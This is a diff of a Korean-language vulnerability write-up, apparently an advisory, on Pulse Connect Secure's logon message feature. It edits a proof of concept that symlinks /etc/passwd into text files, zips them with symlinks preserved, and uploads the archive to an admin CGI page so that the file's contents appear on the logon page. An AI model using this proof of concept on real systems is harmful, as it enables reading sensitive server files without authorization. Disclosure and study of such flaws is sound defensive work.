@@ -27,7 +27,13 @@ SSL VPN 서비스인 Pulse Connect Secure에서 로그온 메시지 구성 요�
 
 다음은 `/etc/passwd` 파일을 출력하는 POC입니다.
 
-`ln -s /etc/passwd default.txt`
-`ln -s /etc/passwd en.txt`
+```
+ln -s /etc/passwd default.txt
+ln -s /etc/passwd en.txt
+
+zip --symlinks logon.zip default.txt en.txt
+adding: default.txt (stored 0%)
+adding: en.txt (stored 0%)
+```
 
 위와 같이 파일에 심볼릭 링크를 설정해 zip으로 압축한 뒤 `/dana-admin/auth/signinNotf.cgi` 페이지에 업로드하면 로그온 페이지에 `/etc/passwd`의 내용이 표시됩니다.
